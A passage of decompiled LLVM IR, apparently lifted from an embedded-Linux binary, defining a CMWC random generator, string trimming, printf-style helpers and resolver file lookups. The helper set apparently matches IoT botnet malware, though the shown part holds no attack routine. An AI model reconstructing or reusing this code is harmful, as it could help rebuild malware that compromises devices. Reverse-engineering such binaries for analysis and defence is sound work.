@global_var_2ee90.1079 = global i32 0
@global_var_2ee7c.1084 = local_unnamed_addr global i32 0
@global_var_15700.1087 = constant i32 -369095550
@global_var_28bfc = external local_unnamed_addr global i32
@global_var_14450.1098 = constant i32 -442564608
@global_var_1797c.1100 = constant i32 -335544701
@global_var_17ab4.1103 = constant i32 -275775369
@global_var_2eeb8.1105 = global i32 0
@global_var_2ee98.1107 = global i32 0
@global_var_2061c.1109 = constant [4 x i8] c"inf\00"
@global_var_2061f.1113 = constant i32 1179535616
@global_var_2062c.1115 = constant i32 2883630
@global_var_2ee9c.1123 = global i32 0
@global_var_2eeb4.1128 = local_unnamed_addr global i32 0
@global_var_14054.1133 = constant i32 -382910448
@global_var_2ef84.1136 = global i32 0
@global_var_20678.1138 = constant i32 46
@global_var_2ef64.1140 = global i32 0
@global_var_167b4.1142 = constant i32 -481296384
@global_var_19794.1143 = constant i32 -369098656
@global_var_2067c.1150 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_20690.1152 = constant i32 114
@global_var_20694.1154 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_206ac.1157 = constant [11 x i8] c"nameserver\00"
@global_var_206b8.1160 = constant [7 x i8] c"domain\00"
@global_var_206c0.1162 = constant [7 x i8] c"search\00"
@global_var_2ef88.1167 = global i32 0
@global_var_2ef8c.1169 = global i32 0
@global_var_2cc60.1176 = global i32 0
@global_var_19e44.1178 = constant i32 -442564544
@global_var_2cc64.1180 = global i32 0
@global_var_20003.1188 = constant [3 x i8] c"et\00"
@global_var_20000.1189 = constant [6 x i8] c"reset\00"
@global_var_2891c.1192 = global i32 2
@global_var_1a320.1198 = constant i32 -442564492
@global_var_206dc.1227 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_206c8.1229 = constant i32 0
@global_var_206f0.1232 = constant [3 x i8] c"%x\00"
@global_var_206f4.1235 = constant [11 x i8] c"/etc/hosts\00"
@global_var_20700.1237 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_1a5ac.1241 = constant i32 -382908944
@global_var_2871c.1244 = global i32 0
@global_var_28c28.5 = external global i8*
@global_var_28c56.67 = external global i8*
@global_var_28c57.68 = local_unnamed_addr global i8 0
@global_var_28c58.69 = local_unnamed_addr global i8 0
@global_var_28c59.70 = local_unnamed_addr global i8 0
@global_var_28c5a.71 = local_unnamed_addr global i8 0
@2 = internal constant [3 x i8] c" \01\00"
@global_var_28920.876 = global i8* getelementptr inbounds ([3 x i8], [3 x i8]* @2, i32 0, i32 0)
@global_var_28970.877 = local_unnamed_addr global i8 16
@global_var_28921.883 = local_unnamed_addr global i8 1
@global_var_28971.884 = local_unnamed_addr global i8 1
@global_var_176c8.894 = constant i8 0
@3 = internal constant [2 x i8] c"\01\00"
@global_var_28c08.1130 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @3, i32 0, i32 0)
@global_var_28c09.1131 = local_unnamed_addr global i8 0
@global_var_1f008.869 = constant [2 x i8] c"r\00"

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_8098 = load i32, i32* @r4, align 4
  %v0_80a0 = call i32 @frame_dummy()
  store i32 %v0_80a0, i32* @r0, align 4
  %v1_80a4 = call i32 @__do_global_ctors_aux(i32 %v0_80a0)
  call void @__pseudo_branch(i32 %v3_8098)
  ret i32 %v1_80a4
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_80b0 = load i32, i32* @r4, align 4
  store i32 %v3_80b0, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i8** @global_var_28c28.5 to i32), i32* %r5.global-to-local, align 4
  %v2_80b8 = load i8, i8* bitcast (i8** @global_var_28c28.5 to i8*), align 4
  %v2_80bc = icmp eq i8 %v2_80b8, 0
  br i1 %v2_80bc, label %bb7, label %bb

bb:                                               ; preds = %entry
  %v12_80c0 = load i32, i32* @r0, align 4
  ret i32 %v12_80c0

bb7:                                              ; preds = %entry
  store i32 ptrtoint (i32** @global_var_28734.8 to i32), i32* %r4.global-to-local, align 4
  %v2_80c8 = load i32, i32* bitcast (i32** @global_var_28734.8 to i32*), align 4
  store i32 %v2_80c8, i32* %r2.global-to-local, align 4
  %v2_80d0 = icmp eq i32 %v2_80c8, 0
  br i1 %v2_80d0, label %bb8, label %dec_label_pc_80d8

dec_label_pc_80d8:                                ; preds = %bb7, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge
  %v1_80dc = phi i32 [ %v1_80dc.pre, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ ptrtoint (i32** @global_var_28734.8 to i32), %bb7 ]
  %v0_80d8 = phi i32 [ %v2_80e8, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ %v2_80c8, %bb7 ]
  %v1_80d8 = add i32 %v0_80d8, 4
  %v2_80dc = inttoptr i32 %v1_80dc to i32*
  store i32 %v1_80d8, i32* %v2_80dc, align 4
  %v0_80e4 = load i32, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v0_80e4)
  %v2_80e8 = load i32, i32* bitcast (i32** @global_var_28734.8 to i32*), align 4
  store i32 %v2_80e8, i32* %r2.global-to-local, align 4
  %v2_80f0 = icmp eq i32 %v2_80e8, 0
  br i1 %v2_80f0, label %.loopexit, label %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge

dec_label_pc_80d8.dec_label_pc_80d8_crit_edge:    ; preds = %dec_label_pc_80d8
  %v1_80dc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_80d8

.loopexit:                                        ; preds = %dec_label_pc_80d8
  %v2_8110.pre = load i32, i32* %r5.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %.loopexit, %bb7
  %v2_8110 = phi i32 [ %v2_8110.pre, %.loopexit ], [ ptrtoint (i8** @global_var_28c28.5 to i32), %bb7 ]
  %v3_8110 = inttoptr i32 %v2_8110 to i8*
  store i8 1, i8* %v3_8110, align 1
  %v2_8114 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8114, i32* %r4.global-to-local, align 4
  %v11_8114 = load i32, i32* @r0, align 4
  ret i32 %v11_8114

; uselistorder directives
  uselistorder i32 %v2_80e8, { 1, 2, 0 }
  uselistorder i32** @global_var_28734.8, { 1, 0 }
  uselistorder i8** @global_var_28c28.5, { 1, 0 }
  uselistorder label %dec_label_pc_80d8, { 1, 0 }
}

define i32 @call___do_global_dtors_aux() local_unnamed_addr {
entry:
  %v5_812c = load i32, i32* @r0, align 4
  ret i32 %v5_812c
}

define i32 @frame_dummy() local_unnamed_addr {
.thread:
  %v2_8150 = load i32, i32* @global_var_28728.18, align 4
  %v2_8154 = icmp eq i32 %v2_8150, 0
  br i1 %v2_8154, label %bb, label %bb2

bb:                                               ; preds = %.thread
  ret i32 ptrtoint (i32* @global_var_28728.18 to i32)

bb2:                                              ; preds = %.thread
  ret i32 ptrtoint (i32* @global_var_28728.18 to i32)

; uselistorder directives
  uselistorder i32* @global_var_28728.18, { 1, 0 }
}

define i32 @call_frame_dummy() local_unnamed_addr {
entry:
  %v5_818c = load i32, i32* @r0, align 4
  ret i32 %v5_818c
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_8198 = ptrtoint i32* %stack_var_4 to i32
  %v8_81b8 = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_130f0.22 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32916, i32 114132, i32 %arg1, i32 %v4_8198)
  %v0_81bc = call i32 @abort()
  ret i32 %v0_81bc
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_81dc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_81dc, i32* @global_var_28c5c.25, align 4
  %v1_81fc = add i32 %v0_81dc, -1640531527
  store i32 %v1_81fc, i32* @global_var_28c60.26, align 4
  %v1_8218 = add i32 %v0_81dc, 1013904242
  store i32 %v1_8218, i32* @global_var_28c64.27, align 4
  br label %dec_label_pc_8230

dec_label_pc_8230:                                ; preds = %entry, %dec_label_pc_8230
  %storemerge12 = phi i32 [ 3, %entry ], [ %v1_8274, %dec_label_pc_8230 ]
  store i32 %storemerge12, i32* %r0.global-to-local, align 4
  %tmp = mul i32 %storemerge12, 4
  %v5_8240 = add i32 %tmp, add (i32 ptrtoint (i32* @global_var_28c5c.25 to i32), i32 -12)
  %v6_8240 = inttoptr i32 %v5_8240 to i32*
  %v7_8240 = load i32, i32* %v6_8240, align 4
  %tmp9 = mul i32 %storemerge12, 4
  %v5_8250 = add i32 %tmp9, add (i32 ptrtoint (i32* @global_var_28c5c.25 to i32), i32 -8)
  %v6_8250 = inttoptr i32 %v5_8250 to i32*
  %v7_8250 = load i32, i32* %v6_8250, align 4
  %v2_8254 = xor i32 %storemerge12, -1640531527
  %v2_825c = xor i32 %v2_8254, %v7_8240
  %v2_8264 = xor i32 %v2_825c, %v7_8250
  %v5_826c = mul nuw nsw i32 %storemerge12, 4
  %v6_826c = add i32 %v5_826c, ptrtoint (i32* @global_var_28c5c.25 to i32)
  %v7_826c = inttoptr i32 %v6_826c to i32*
  store i32 %v2_8264, i32* %v7_826c, align 4
  %v1_8274 = add nuw nsw i32 %storemerge12, 1
  %v7_828c = icmp slt i32 %v1_8274, 4096
  br i1 %v7_828c, label %dec_label_pc_8230, label %dec_label_pc_8290

dec_label_pc_8290:                                ; preds = %dec_label_pc_8230
  %v9_8294 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v9_8294

; uselistorder directives
  uselistorder i32 %storemerge12, { 5, 3, 2, 0, 1, 4 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_8230, { 1, 0 }
}

define i32 @rand_cmwc() local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_82a0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_82a0, i32* @ip, align 4
  %v2_82d0 = load i32, i32* @global_var_287dc.30, align 4
  %v1_82d4 = add i32 %v2_82d0, 1
  %v3_82dc = urem i32 %v1_82d4, 4096
  store i32 %v3_82dc, i32* @global_var_287dc.30, align 4
  %v4_82f4 = mul nuw nsw i32 %v3_82dc, 4
  %v5_82f4 = add i32 %v4_82f4, ptrtoint (i32* @global_var_28c5c.25 to i32)
  %v6_82f4 = inttoptr i32 %v5_82f4 to i32*
  %v7_82f4 = load i32, i32* %v6_82f4, align 4
  %v2_830c = mul i32 %v7_82f4, 18782
  store i32 %v2_830c, i32* %r1.global-to-local, align 4
  %v2_8324 = load i32, i32* @global_var_287d8.33, align 4
  %v2_832c = add i32 %v2_8324, %v2_830c
  %v3_832c = icmp ult i32 %v2_832c, %v2_8324
  %v4_8330 = zext i1 %v3_832c to i32
  %v2_8360 = add i32 %v4_8330, %v2_832c
  %v3_8374 = icmp ult i32 %v2_8360, %v4_8330
  br i1 %v3_8374, label %dec_label_pc_837c, label %dec_label_pc_839c

dec_label_pc_837c:                                ; preds = %entry
  %v1_8380 = add i32 %v2_8360, 1
  %v1_8390 = select i1 %v3_832c, i32 2, i32 1
  br label %dec_label_pc_839c

dec_label_pc_839c:                                ; preds = %entry, %dec_label_pc_837c
  %storemerge = phi i32 [ %v1_8390, %dec_label_pc_837c ], [ %v4_8330, %entry ]
  %stack_var_-28.0 = phi i32 [ %v1_8380, %dec_label_pc_837c ], [ %v2_8360, %entry ]
  store i32 %storemerge, i32* @global_var_287d8.33, align 4
  store i32 %v3_82dc, i32* %r1.global-to-local, align 4
  %v2_83ac = sub i32 -2, %stack_var_-28.0
  store i32 %v2_83ac, i32* %v6_82f4, align 4
  %v1_83bc = load i32, i32* %r1.global-to-local, align 4
  %v4_83bc = mul i32 %v1_83bc, 4
  %v5_83bc = add i32 %v4_83bc, ptrtoint (i32* @global_var_28c5c.25 to i32)
  %v6_83bc = inttoptr i32 %v5_83bc to i32*
  %v7_83bc = load i32, i32* %v6_83bc, align 4
  ret i32 %v7_83bc

; uselistorder directives
  uselistorder i32 %v4_8330, { 0, 2, 1 }
  uselistorder i32 %v2_8324, { 1, 0 }
  uselistorder i32 %v3_82dc, { 2, 1, 0 }
  uselistorder i32* @global_var_28c5c.25, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_28c5c.25 to i32), { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_839c, { 1, 0 }
}

define i32 @trim(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i8*, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_83d8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_83d8, i32* @ip, align 4
  store i8* %arg1, i8** %stack_var_-32, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_83f8 = call i32 @strlen(i8* %arg1)
  store i32 %v3_83f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8418

dec_label_pc_8418:                                ; preds = %dec_label_pc_8418, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_8410, %dec_label_pc_8418 ]
  %v3_8420 = load i8*, i8** %stack_var_-32, align 4
  %v4_8420 = ptrtoint i8* %v3_8420 to i32
  %v2_8424 = add i32 %v4_8420, %stack_var_-24.0
  %v1_8428 = inttoptr i32 %v2_8424 to i8*
  %v2_8428 = load i8, i8* %v1_8428, align 1
  %v3_8428 = zext i8 %v2_8428 to i32
  store i32 %v3_8428, i32* %r0.global-to-local, align 4
  %v1_8430 = call i32 @isspace(i32 %v3_8428)
  store i32 %v1_8430, i32* %r0.global-to-local, align 4
  %v2_8438 = icmp eq i32 %v1_8430, 0
  %v1_8410 = add i32 %stack_var_-24.0, 1
  br i1 %v2_8438, label %dec_label_pc_8450.preheader, label %dec_label_pc_8418

dec_label_pc_8450.preheader:                      ; preds = %dec_label_pc_8418
  %v1_8400 = add i32 %v3_83f8, -1
  %v5_845c11 = icmp slt i32 %v1_8400, %stack_var_-24.0
  br i1 %v5_845c11, label %dec_label_pc_84d0.preheader, label %dec_label_pc_8460

dec_label_pc_8444:                                ; preds = %dec_label_pc_8460
  %v1_8448 = add i32 %stack_var_-20.012, -1
  %v5_845c = icmp slt i32 %v1_8448, %stack_var_-24.0
  br i1 %v5_845c, label %dec_label_pc_84d0.preheader, label %dec_label_pc_8460

dec_label_pc_8460:                                ; preds = %dec_label_pc_8450.preheader, %dec_label_pc_8444
  %stack_var_-20.012 = phi i32 [ %v1_8448, %dec_label_pc_8444 ], [ %v1_8400, %dec_label_pc_8450.preheader ]
  %v3_8468 = load i8*, i8** %stack_var_-32, align 4
  %v4_8468 = ptrtoint i8* %v3_8468 to i32
  %v2_846c = add i32 %v4_8468, %stack_var_-20.012
  %v1_8470 = inttoptr i32 %v2_846c to i8*
  %v2_8470 = load i8, i8* %v1_8470, align 1
  %v3_8470 = zext i8 %v2_8470 to i32
  store i32 %v3_8470, i32* %r0.global-to-local, align 4
  %v1_8478 = call i32 @isspace(i32 %v3_8470)
  store i32 %v1_8478, i32* %r0.global-to-local, align 4
  %v2_8480 = icmp eq i32 %v1_8478, 0
  br i1 %v2_8480, label %dec_label_pc_84d0.preheader, label %dec_label_pc_8444

dec_label_pc_84d0.preheader:                      ; preds = %dec_label_pc_8444, %dec_label_pc_8460, %dec_label_pc_8450.preheader
  %stack_var_-20.0.lcssa = phi i32 [ %v1_8400, %dec_label_pc_8450.preheader ], [ %v1_8448, %dec_label_pc_8444 ], [ %stack_var_-20.012, %dec_label_pc_8460 ]
  br label %dec_label_pc_84d0

dec_label_pc_8494:                                ; preds = %dec_label_pc_84d0
  %v2_84b8 = add i32 %v4_84f0, %storemerge2
  %v1_84bc = inttoptr i32 %v2_84b8 to i8*
  %v2_84bc = load i8, i8* %v1_84bc, align 1
  %v3_84c0 = inttoptr i32 %v2_84f4 to i8*
  store i8 %v2_84bc, i8* %v3_84c0, align 1
  %v1_84c8 = add i32 %storemerge2, 1
  br label %dec_label_pc_84d0

dec_label_pc_84d0:                                ; preds = %dec_label_pc_84d0.preheader, %dec_label_pc_8494
  %storemerge2 = phi i32 [ %v1_84c8, %dec_label_pc_8494 ], [ %stack_var_-24.0, %dec_label_pc_84d0.preheader ]
  %v7_84dc = icmp sgt i32 %storemerge2, %stack_var_-20.0.lcssa
  %v2_84e8 = sub i32 %storemerge2, %stack_var_-24.0
  %v3_84f0 = load i8*, i8** %stack_var_-32, align 4
  %v4_84f0 = ptrtoint i8* %v3_84f0 to i32
  %v2_84f4 = add i32 %v4_84f0, %v2_84e8
  br i1 %v7_84dc, label %dec_label_pc_84e0, label %dec_label_pc_8494

dec_label_pc_84e0:                                ; preds = %dec_label_pc_84d0
  %v3_84fc = inttoptr i32 %v2_84f4 to i8*
  store i8 0, i8* %v3_84fc, align 1
  %v9_8504 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v9_8504

; uselistorder directives
  uselistorder i32 %storemerge2, { 2, 3, 0, 1 }
  uselistorder i32 %v1_8400, { 1, 0, 2 }
  uselistorder i32 %stack_var_-24.0, { 1, 0, 2, 3, 5, 4 }
  uselistorder i8** %stack_var_-32, { 3, 2, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 1, 5, 3, 7, 6, 0 }
  uselistorder i32 (i32)* @isspace, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_84d0, { 1, 0 }
  uselistorder label %dec_label_pc_84d0.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8460, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8508 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8508, i32* @ip, align 4
  %v0_8518 = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_8524 = icmp eq i32 %v0_8518, 0
  br i1 %v2_8524, label %dec_label_pc_8558, label %dec_label_pc_852c

dec_label_pc_852c:                                ; preds = %entry
  %v1_8530 = inttoptr i32 %v0_8518 to i32*
  %v2_8530 = load i32, i32* %v1_8530, align 4
  %v1_853c = trunc i32 %arg2 to i8
  %v3_853c = inttoptr i32 %v2_8530 to i8*
  store i8 %v1_853c, i8* %v3_853c, align 1
  %v2_8544 = load i32, i32* %v1_8530, align 4
  %v1_8548 = add i32 %v2_8544, 1
  store i32 %v1_8548, i32* %v1_8530, align 4
  %v9_8570.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_856c

dec_label_pc_8558:                                ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r2, align 4
  %v3_8568 = call i32 @__libc_write(i32 1, i32* nonnull %stack_var_-24)
  store i32 %v3_8568, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_856c

dec_label_pc_856c:                                ; preds = %dec_label_pc_852c, %dec_label_pc_8558
  %v9_8570 = phi i32 [ %v9_8570.pre, %dec_label_pc_852c ], [ %v3_8568, %dec_label_pc_8558 ]
  ret i32 %v9_8570

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 4, 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_856c, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-48 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8574 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8574, i32* @ip, align 4
  %v3_8578 = load i32, i32* @fp, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %tmp41 = icmp slt i32 %arg3, 1
  br i1 %tmp41, label %dec_label_pc_8630, label %dec_label_pc_85b0

dec_label_pc_85b0:                                ; preds = %entry
  %v2_85e018 = load i8, i8* %arg2, align 1
  %v2_85e420 = icmp eq i8 %v2_85e018, 0
  br i1 %v2_85e420, label %dec_label_pc_85ec, label %dec_label_pc_85c4

dec_label_pc_85c4:                                ; preds = %dec_label_pc_85b0, %dec_label_pc_85c4
  %v4_85dc22 = phi i32 [ %v1_85d4, %dec_label_pc_85c4 ], [ %tmp, %dec_label_pc_85b0 ]
  %stack_var_-40.021 = phi i32 [ %v1_85c8, %dec_label_pc_85c4 ], [ 0, %dec_label_pc_85b0 ]
  %v1_85c8 = add i32 %stack_var_-40.021, 1
  %v1_85d4 = add i32 %v4_85dc22, 1
  %v5_85d8 = inttoptr i32 %v1_85d4 to i8*
  %v2_85e0 = load i8, i8* %v5_85d8, align 1
  %v2_85e4 = icmp eq i8 %v2_85e0, 0
  br i1 %v2_85e4, label %dec_label_pc_85ec, label %dec_label_pc_85c4

dec_label_pc_85ec:                                ; preds = %dec_label_pc_85c4, %dec_label_pc_85b0
  %stack_var_-40.0.lcssa = phi i32 [ 0, %dec_label_pc_85b0 ], [ %v1_85c8, %dec_label_pc_85c4 ]
  %v5_85f8 = icmp slt i32 %stack_var_-40.0.lcssa, %arg3
  br i1 %v5_85f8, label %dec_label_pc_8608, label %dec_label_pc_8618

dec_label_pc_8608:                                ; preds = %dec_label_pc_85ec
  %v2_8610 = sub i32 %arg3, %stack_var_-40.0.lcssa
  br label %dec_label_pc_8618

dec_label_pc_8618:                                ; preds = %dec_label_pc_85ec, %dec_label_pc_8608
  %storemerge2 = phi i32 [ %v2_8610, %dec_label_pc_8608 ], [ 0, %dec_label_pc_85ec ]
  %v1_861c = and i32 %arg4, 2
  %v2_8620 = icmp eq i32 %v1_861c, 0
  br i1 %v2_8620, label %dec_label_pc_8630, label %dec_label_pc_8628

dec_label_pc_8628:                                ; preds = %dec_label_pc_8618
  br label %dec_label_pc_8630

dec_label_pc_8630:                                ; preds = %dec_label_pc_8618, %entry, %dec_label_pc_8628
  %stack_var_-28.0 = phi i32 [ %arg3, %entry ], [ %storemerge2, %dec_label_pc_8618 ], [ %storemerge2, %dec_label_pc_8628 ]
  %stack_var_-44.0 = phi i32 [ 32, %entry ], [ 32, %dec_label_pc_8618 ], [ 48, %dec_label_pc_8628 ]
  %v1_8634 = urem i32 %arg4, 2
  %v2_8638 = icmp eq i32 %v1_8634, 0
  br i1 %v2_8638, label %dec_label_pc_8668.preheader, label %dec_label_pc_86a4.preheader

dec_label_pc_8668.preheader:                      ; preds = %dec_label_pc_8630
  %v5_867015 = icmp sgt i32 %stack_var_-28.0, 0
  br i1 %v5_867015, label %dec_label_pc_8644.lr.ph, label %dec_label_pc_86a4.preheader

dec_label_pc_8644.lr.ph:                          ; preds = %dec_label_pc_8668.preheader
  %v2_864c = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_8644

dec_label_pc_8644:                                ; preds = %dec_label_pc_8644.lr.ph, %dec_label_pc_8644
  %stack_var_-28.116 = phi i32 [ %stack_var_-28.0, %dec_label_pc_8644.lr.ph ], [ %v1_8660, %dec_label_pc_8644 ]
  %v3_864c = call i32 @printchar(i32* %v2_864c, i32 %stack_var_-44.0)
  %v3_8650 = load i32, i32* %stack_var_-48, align 4
  %v1_8654 = add i32 %v3_8650, 1
  store i32 %v1_8654, i32* %stack_var_-48, align 4
  %v1_8660 = add nsw i32 %stack_var_-28.116, -1
  %v5_8670 = icmp sgt i32 %stack_var_-28.116, 1
  br i1 %v5_8670, label %dec_label_pc_8644, label %dec_label_pc_86a4.preheader

dec_label_pc_86a4.preheader:                      ; preds = %dec_label_pc_8644, %dec_label_pc_8668.preheader, %dec_label_pc_8630
  %v3_86e826 = phi i32 [ 0, %dec_label_pc_8630 ], [ 0, %dec_label_pc_8668.preheader ], [ %v1_8654, %dec_label_pc_8644 ]
  %stack_var_-28.2.ph = phi i32 [ %stack_var_-28.0, %dec_label_pc_8630 ], [ %stack_var_-28.0, %dec_label_pc_8668.preheader ], [ 0, %dec_label_pc_8644 ]
  %v2_86a88 = load i8, i8* %arg2, align 1
  %v2_86ac10 = icmp eq i8 %v2_86a88, 0
  br i1 %v2_86ac10, label %dec_label_pc_86dc.preheader, label %dec_label_pc_8678.lr.ph

dec_label_pc_8678.lr.ph:                          ; preds = %dec_label_pc_86a4.preheader
  %v2_8688 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_8678

dec_label_pc_8678:                                ; preds = %dec_label_pc_8678.lr.ph, %dec_label_pc_8678
  %v4_86a412 = phi i32 [ %tmp, %dec_label_pc_8678.lr.ph ], [ %v1_869c, %dec_label_pc_8678 ]
  %stack_var_-24.011 = phi i8* [ %arg2, %dec_label_pc_8678.lr.ph ], [ %v5_86a0, %dec_label_pc_8678 ]
  %v2_867c = load i8, i8* %stack_var_-24.011, align 1
  %v3_867c = zext i8 %v2_867c to i32
  %v3_8688 = call i32 @printchar(i32* %v2_8688, i32 %v3_867c)
  %v3_868c = load i32, i32* %stack_var_-48, align 4
  %v1_8690 = add i32 %v3_868c, 1
  store i32 %v1_8690, i32* %stack_var_-48, align 4
  %v1_869c = add i32 %v4_86a412, 1
  %v5_86a0 = inttoptr i32 %v1_869c to i8*
  %v2_86a8 = load i8, i8* %v5_86a0, align 1
  %v2_86ac = icmp eq i8 %v2_86a8, 0
  br i1 %v2_86ac, label %dec_label_pc_86dc.preheader, label %dec_label_pc_8678

dec_label_pc_86dc.preheader:                      ; preds = %dec_label_pc_8678, %dec_label_pc_86a4.preheader
  %v3_86e825 = phi i32 [ %v3_86e826, %dec_label_pc_86a4.preheader ], [ %v1_8690, %dec_label_pc_8678 ]
  %v5_86e45 = icmp sgt i32 %stack_var_-28.2.ph, 0
  br i1 %v5_86e45, label %dec_label_pc_86b8.lr.ph, label %dec_label_pc_86e8

dec_label_pc_86b8.lr.ph:                          ; preds = %dec_label_pc_86dc.preheader
  %v2_86c0 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_86b8

dec_label_pc_86b8:                                ; preds = %dec_label_pc_86b8.lr.ph, %dec_label_pc_86b8
  %stack_var_-28.36 = phi i32 [ %stack_var_-28.2.ph, %dec_label_pc_86b8.lr.ph ], [ %v1_86d4, %dec_label_pc_86b8 ]
  %v3_86c0 = call i32 @printchar(i32* %v2_86c0, i32 %stack_var_-44.0)
  %v3_86c4 = load i32, i32* %stack_var_-48, align 4
  %v1_86c8 = add i32 %v3_86c4, 1
  store i32 %v1_86c8, i32* %stack_var_-48, align 4
  %v1_86d4 = add nsw i32 %stack_var_-28.36, -1
  %v5_86e4 = icmp sgt i32 %stack_var_-28.36, 1
  br i1 %v5_86e4, label %dec_label_pc_86b8, label %dec_label_pc_86e8

dec_label_pc_86e8:                                ; preds = %dec_label_pc_86b8, %dec_label_pc_86dc.preheader
  %v3_86e8 = phi i32 [ %v3_86e825, %dec_label_pc_86dc.preheader ], [ %v1_86c8, %dec_label_pc_86b8 ]
  store i32 %v3_8578, i32* @fp, align 4
  ret i32 %v3_86e8

; uselistorder directives
  uselistorder i32 %v1_869c, { 1, 0 }
  uselistorder i32 %stack_var_-40.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_85d4, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i8* %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_86b8, { 1, 0 }
  uselistorder label %dec_label_pc_8678, { 1, 0 }
  uselistorder label %dec_label_pc_8644, { 1, 0 }
  uselistorder label %dec_label_pc_8630, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8618, { 1, 0 }
  uselistorder label %dec_label_pc_85c4, { 1, 0 }
}

define i32 @printi(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_86fc = load i32, i32* @fp, align 4
  store i32 34564, i32* %stack_var_-4, align 4
  %v2_8700 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8700, i32* @fp, align 4
  %v1_8734 = icmp slt i32 %arg2, 0
  %v2_8734 = icmp eq i32 %arg2, 0
  br i1 %v2_8734, label %dec_label_pc_873c, label %dec_label_pc_8770

dec_label_pc_873c:                                ; preds = %entry
  store i32 48, i32* %stack_var_-28, align 4
  %v5_8760 = bitcast i32* %stack_var_-28 to i8*
  %v6_8760 = call i32 @prints(i32 %arg1, i8* %v5_8760, i32 %arg5, i32 %arg6, i32 0)
  br label %dec_label_pc_88d0

dec_label_pc_8770:                                ; preds = %entry
  %v2_8774 = icmp eq i32 %arg4, 0
  br i1 %v2_8774, label %dec_label_pc_87a8, label %dec_label_pc_877c

dec_label_pc_877c:                                ; preds = %dec_label_pc_8770
  %v7_8780 = icmp eq i32 %arg3, 10
